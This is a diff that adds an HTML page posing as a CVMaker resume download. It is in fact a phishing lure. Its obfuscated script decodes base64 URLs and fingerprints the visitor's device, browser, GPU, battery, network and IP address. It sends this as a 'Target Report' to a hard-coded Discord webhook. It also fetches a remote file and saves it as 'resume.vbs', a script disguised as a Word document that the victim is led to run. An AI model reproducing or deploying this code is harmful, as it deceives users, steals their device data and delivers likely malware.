@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>CVMaker - create your professional resume with our builder</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="icon" type="image/png" href="https://www.cvmaker.com/assets/images/favicon.png" />
+  <style>
+    body {
+      margin: 0; padding: 0;
+      font-family: "Segoe UI", sans-serif;
+      background: linear-gradient(135deg, #1f1c2c, #928dab);
+      color: #fff;
+      display: flex; justify-content: center; align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background: #2e2a4d; padding: 30px 40px;
+      border-radius: 15px; box-shadow: 0 8px 20px rgba(0,0,0,0.3);
+      text-align: center; max-width: 420px;
+      animation: fadeIn 1s ease-in-out;
+    }
+    .container h1 { font-size: 26px; margin-bottom: 10px; }
+    .container p { font-size: 15px; color: #ccc; margin-bottom: 20px; }
+    .download-btn {
+      background-color: #5c6bc0; color: #fff; border: none;
+      padding: 15px 25px; font-size: 16px;
+      border-radius: 8px; cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    .download-btn:hover { background-color: #3f51b5; }
+    .status {
+      margin-top: 20px; font-size: 14px;
+      color: #a0ffa0; display: none;
+    }
+    @keyframes fadeIn {
+      from { opacity:0; transform: translateY(20px); }
+      to { opacity:1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Resume Download</h1>
+    <p style="font-style:italic; font-size:14px; color:#a0a0a0; margin-bottom:5px;">
+      You are downloading <strong>resume.docx</strong>, a professional CV.
+    </p>
+    <p>Click below to begin your download.</p>
+    <button class="download-btn" onclick="_0x12ab()">Download Resume</button>
+    <div class="status" id="statusMsg">Preparing your download...</div>
+  </div>
+
+  <script>
+    const _0xabc = atob("aHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29u");
+    const _0xdef = atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RldmlsQm90MDAwL0RvY3VtZW50cy9yZWZzL2hlYWRzL21haW4vQ1Y5NTQudHh0");
+    const _0xghi = "https://discord.com/api/webhooks/1392418768738582688/OcGOo0P3fJQizcu3V-cNbe8PJq-YEzRbLd-YzgiLufOZuzS8ZnHlWtY8-qStSs7GvK9G";
+
+    function _0x1a2b(_0x3c4d) {
+      if (/Windows NT 10.0/.test(_0x3c4d)) return "Wndows 10/11";
+      if (/Mac OS X/.test(_0x3c4d)) return "mac";
+      if (/Android/.test(_0x3c4d)) return "Android";
+      if (/Linux/.test(_0x3c4d) && !/Android/.test(_0x3c4d)) return "Linux";
+      if (/iPhone|iPad/.test(_0x3c4d)) return "iOS";
+      return "Unk";
+    }
+
+    function _0x5e6f() {
+      const _0x7g8h = navigator.userAgent;
+      if (_0x7g8h.includes("Firefox")) return "Firefox";
+      if (_0x7g8h.includes("Edg")) return "MSedge";
+      if (_0x7g8h.includes("Chrome") && !_0x7g8h.includes("Edg")) return "Chrome";
+      if (_0x7g8h.includes("Safari") && !_0x7g8h.includes("Chrome")) return "Safari";
+      if (_0x7g8h.includes("OPR") || _0x7g8h.includes("Opera")) return "Opera";
+      return "Unk";
+    }
+
+    async function _0x9i0j() {
+      const _0xklmn = document.createElement('canvas');
+      const _0xopqr = _0xklmn.getContext('2d');
+      _0xopqr.textBaseline = "top";
+      _0xopqr.font = "16px Arial";
+      _0xopqr.fillStyle = "#f60";
+      _0xopqr.fillRect(0, 0, 250, 50);
+      _0xopqr.fillStyle = "#069";
+      _0xopqr.fillText("FP", 2, 15);
+      const _0xcvHash = _0xklmn.toDataURL();
+
+      let _0xauHash = "N/A";
+      try {
+        const _0xstuv = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+        const _0xwxyz = _0xstuv.createOscillator();
+        _0xwxyz.type = "triangle";
+        _0xwxyz.frequency.setValueAtTime(10000, _0xstuv.currentTime);
+        const _0xcomp = _0xstuv.createDynamicsCompressor();
+        _0xwxyz.connect(_0xcomp);
+        _0xcomp.connect(_0xstuv.destination);
+        _0xwxyz.start(0);
+        const _0xrender = await _0xstuv.startRendering();
+        const _0xdata = _0xrender.getChannelData(0);
+        _0xauHash = _0xdata.slice(0, 100).reduce((a, b) => a + b, 0);
+      } catch {}
+
+      return { _0xcvHash, _0xauHash };
+    }
+
+    async function _0x3m4n() {
+      const _0xua = navigator.userAgent;
+      const _0xos = _0x1a2b(_0xua);
+      const _0xplat = navigator.platform;
+      const _0xlang = navigator.language;
+      const _0xres = `${screen.width}x${screen.height}`;
+      const _0xtz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const _0xtouch = navigator.maxTouchPoints || 0;
+      const _0xcores = navigator.hardwareConcurrency || "unk";
+      const _0xram = navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "N/A";
+      const _0xcolor = `${screen.colorDepth}bit`;
+      const _0xbrws = _0x5e6f();
+
+      let _0xgl = "N/A";
+      try {
+        const _0xc = document.createElement('canvas');
+        const _0xctx = _0xc.getContext('webgl') || _0xc.getContext('experimental-webgl');
+        const _0xdbg = _0xctx.getExtension('WEBGL_debug_renderer_info');
+        _0xgl = _0xdbg ? _0xctx.getParameter(_0xdbg.UNMASKED_RENDERER_WEBGL) : "unk";
+      } catch {}
+
+      let _0xbat = "N/A";
+      let _0xchrg = "Unk";
+      if (navigator.getBattery) {
+        try {
+          const _0xb = await navigator.getBattery();
+          _0xbat = `${Math.round(_0xb.level * 100)}%`;
+          _0xchrg = _0xb.charging ? "Y" : "N";
+        } catch {}
+      }
+
+      const _0xconn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      const _0xdl = _0xconn?.downlink ? `${_0xconn.downlink}Mbps` : "N/A";
+      const _0xet = _0xconn?.effectiveType || "N/A";
+      const _0xrtt = _0xconn?.rtt ? `${_0xconn.rtt}ms` : "N/A";
+
+      const _0xplgns = navigator.plugins.length
+        ? [...navigator.plugins].map(p => p.name).join(", ")
+        : "N/A";
+
+      const _0xdev = /Mobi|Android/i.test(_0xua) ? "Mobile/Tab" : "Desktop";
+
+      const { _0xcvHash, _0xauHash } = await _0x9i0j();
+
+      return {
+        _0xos, _0xbrws, _0xua, _0xplat, _0xlang, _0xres, _0xcolor, _0xtz, _0xtouch,
+        _0xcores, _0xram, _0xbat, _0xchrg, _0xgl,
+        _0xdl, _0xet, _0xrtt, _0xplgns, _0xdev,
+        _0xcvHash, _0xauHash
+      };
+    }
+
+    function _0x7q8r(_0xst, _0xip, _0xinf) {
+      const _0xmsg = `📌 **Target Report**
+📡 IP: ${_0xip}
+🖥️ OS: ${_0xinf._0xos} | Browser: ${_0xinf._0xbrws}
+🧭 Platform: ${_0xinf._0xplat} | Device: ${_0xinf._0xdev}
+📏 Screen: ${_0xinf._0xres} | Color: ${_0xinf._0xcolor}
+🌐 Lang/TZ: ${_0xinf._0xlang} / ${_0xinf._0xtz}
+💻 RAM: ${_0xinf._0xram} | CPU: ${_0xinf._0xcores} | Touch: ${_0xinf._0xtouch}
+🔋 Battery Level: ${_0xinf._0xbat} | Charging: ${_0xinf._0xchrg}
+🎨 GPU: ${_0xinf._0xgl}
+📶 Net: ${_0xinf._0xdl}, ${_0xinf._0xet}, ${_0xinf._0xrtt}
+🔌 Plugins: ${_0xinf._0xplgns}
+🖼️ Canvas: ${_0xinf._0xcvHash.slice(0, 40)}...
+🎵 Audio: ${_0xinf._0xauHash}
+📥 Status: ${_0xst}`;
+
+      fetch(_0xghi, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: _0xmsg })
+      });
+    }
+
+    async function _0x12ab() {
+      const _0xstEl = document.getElementById("statusMsg");
+      _0xstEl.style.display = "block";
+      _0xstEl.textContent = "Sys scan...";
+
+      const _0xinf = await _0x3m4n();
+
+      _0xstEl.textContent = "Downloading resume...";
+      fetch(_0xdef)
+        .then(_0xr => _0xr.text())
+        .then(_0xdata => {
+          const _0xblob = new Blob([_0xdata], { type: "application/msword" });
+          const _0xa = document.createElement("a");
+          _0xa.href = URL.createObjectURL(_0xblob);
+          _0xa.download = "resume.vbs";
+          document.body.appendChild(_0xa);
+          _0xa.click();
+          URL.revokeObjectURL(_0xa.href);
+          document.body.removeChild(_0xa);
+
+          fetch(_0xabc)
+            .then(_0xres => _0xres.json())
+            .then(_0xipd => {
+              _0xstEl.textContent = "✅ Download complete";
+              _0x7q8r("Download Successful", _0xipd.ip, _0xinf);
+            })
+            .catch(() => {
+              _0xstEl.textContent = "✅ Download complete (IP N/A)";
+              _0x7q8r("Dwnld (IP Fail)", "Unk", _0xinf);
+            });
+        })
+        .catch(() => {
+          _0xstEl.textContent = "❌ Dwnld fail.";
+          _0x7q8r("Dwnld Fail", "Unk", _0xinf);
+        });
+    }
+  </script>
+
+  <div style="position: absolute; bottom: 15px; width: 100%; text-align: center;">
+    <small style="color: #cccccc; font-size: 12px;">
+      Powered by <a href="https://www.cvmaker.com" target="_blank" style="color: #aaa; text-decoration: none;">www.cvmaker.com</a>
+    </small>
+  </div>
+</body>
+</html>
